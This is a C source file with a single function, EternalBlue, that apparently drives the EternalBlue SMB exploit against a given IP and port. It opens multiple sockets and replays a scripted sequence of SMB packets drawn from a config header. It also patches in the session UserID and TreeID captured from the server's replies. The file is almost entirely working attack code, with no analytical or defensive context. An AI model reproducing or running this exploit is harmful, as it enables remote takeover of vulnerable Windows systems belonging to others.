#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

int EternalBlue(const char *ip, int port)
{
    WSADATA wsa_data;
    SOCKET sockets[NUM_SOCKETS + 1];
    struct sockaddr_in address;
    uint8_t userid[2] = {0, 0};
    uint8_t treeid[2] = {0, 0};
    const char userid_placeholder[] = "__USERID__PLACEHOLDER__";
    const char treeid_placeholder[] = "__TREEID__PLACEHOLDER__";
    const size_t userid_placeholder_len = sizeof(userid_placeholder) - 1;
    const size_t treeid_placeholder_len = sizeof(treeid_placeholder) - 1;
    size_t packet_data_size = sizeof(EB_PACKETS) - 1;
    int wsa_started = 0;
    int result = -1;
    int i;

    if (ip == NULL || port <= 0 || port > 65535)
        return -1;

    for (i = 0; i <= NUM_SOCKETS; ++i)
        sockets[i] = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return -1;
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1) {
        printf("EternalBlue: invalid IPv4 address\n");
        goto cleanup;
    }

    for (i = 0; i < EB_OPS_COUNT; ++i) {
        const eb_op_t *op = &EB_OPS[i];
        uint64_t offset = (uint64_t)op->offset;
        uint64_t length64 = (uint64_t)op->length;
        size_t length;
        int stream = (int)op->stream;

        if (stream < 1 || stream > NUM_SOCKETS ||
            (uint64_t)(size_t)length64 != length64) {
            printf("EternalBlue: invalid operation %d\n", i);
            goto cleanup;
        }
        length = (size_t)length64;

        if (op->kind == 0) {
            if (sockets[stream] != INVALID_SOCKET) {
                printf("EternalBlue: stream %d is already connected\n", stream);
                goto cleanup;
            }
            sockets[stream] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sockets[stream] == INVALID_SOCKET ||
                connect(sockets[stream], (const struct sockaddr *)&address,
                        (int)sizeof(address)) == SOCKET_ERROR) {
                printf("EternalBlue: connect failed on stream %d\n", stream);
                goto cleanup;
            }
            printf("EternalBlue: connected stream %d\n", stream);
        } else if (op->kind == 1) {
            const uint8_t *source;
            uint8_t *buffer;
            size_t input_pos = 0;
            size_t output_pos = 0;

            if (sockets[stream] == INVALID_SOCKET ||
                offset > (uint64_t)packet_data_size ||
                length64 > (uint64_t)packet_data_size - offset) {
                printf("EternalBlue: invalid send operation %d\n", i);
                goto cleanup;
            }

            source = EB_PACKETS + (size_t)offset;
            buffer = (uint8_t *)malloc(length != 0 ? length : 1);
            if (buffer == NULL) {
                printf("EternalBlue: allocation failed\n");
                goto cleanup;
            }

            while (input_pos < length) {
                size_t remaining = length - input_pos;

                if (remaining >= userid_placeholder_len &&
                    memcmp(source + input_pos, userid_placeholder,
                           userid_placeholder_len) == 0) {
                    memcpy(buffer + output_pos, userid, sizeof(userid));
                    input_pos += userid_placeholder_len;
                    output_pos += sizeof(userid);
                } else if (remaining >= treeid_placeholder_len &&
                           memcmp(source + input_pos, treeid_placeholder,
                                  treeid_placeholder_len) == 0) {
                    memcpy(buffer + output_pos, treeid, sizeof(treeid));
                    input_pos += treeid_placeholder_len;
                    output_pos += sizeof(treeid);
                } else {
                    buffer[output_pos++] = source[input_pos++];
                }
            }

            input_pos = 0;
            while (input_pos < output_pos) {
                size_t remaining = output_pos - input_pos;
                int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                int sent = send(sockets[stream], (const char *)buffer + input_pos,
                                chunk, 0);
                if (sent == SOCKET_ERROR || sent == 0) {
                    free(buffer);
                    printf("EternalBlue: send failed on stream %d\n", stream);
                    goto cleanup;
                }
                input_pos += (size_t)sent;
            }

            free(buffer);
            printf("EternalBlue: sent operation %d on stream %d\n", i, stream);
        } else if (op->kind == 2) {
            uint8_t *buffer;
            size_t received = 0;

            if (sockets[stream] == INVALID_SOCKET ||
                (uint64_t)(size_t)length64 != length64) {
                printf("EternalBlue: invalid receive operation %d\n", i);
                goto cleanup;
            }

            buffer = (uint8_t *)malloc(length != 0 ? length : 1);
            if (buffer == NULL) {
                printf("EternalBlue: allocation failed\n");
                goto cleanup;
            }

            while (received < length) {
                size_t remaining = length - received;
                int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                int count = recv(sockets[stream], (char *)buffer + received,
                                 chunk, 0);
                if (count == SOCKET_ERROR || count == 0) {
                    free(buffer);
                    printf("EternalBlue: receive failed on stream %d\n", stream);
                    goto cleanup;
                }
                received += (size_t)count;
            }

            if (op->fix == 1) {
                if (length < 34) {
                    free(buffer);
                    printf("EternalBlue: response too short for UserID\n");
                    goto cleanup;
                }
                memcpy(userid, buffer + 32, sizeof(userid));
            } else if (op->fix == 2) {
                if (length < 30) {
                    free(buffer);
                    printf("EternalBlue: response too short for TreeID\n");
                    goto cleanup;
                }
                memcpy(treeid, buffer + 28, sizeof(treeid));
            }

            free(buffer);
            printf("EternalBlue: received operation %d on stream %d\n", i, stream);
        } else if (op->kind == 3) {
            if (sockets[stream] == INVALID_SOCKET) {
                printf("EternalBlue: stream %d is not connected\n", stream);
                goto cleanup;
            }
            closesocket(sockets[stream]);
            sockets[stream] = INVALID_SOCKET;
            printf("EternalBlue: closed stream %d\n", stream);
        } else {
            printf("EternalBlue: unknown operation kind at %d\n", i);
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    for (i = 1; i <= NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET)
            closesocket(sockets[i]);
    }
    if (wsa_started)
        WSACleanup();
    return result;
}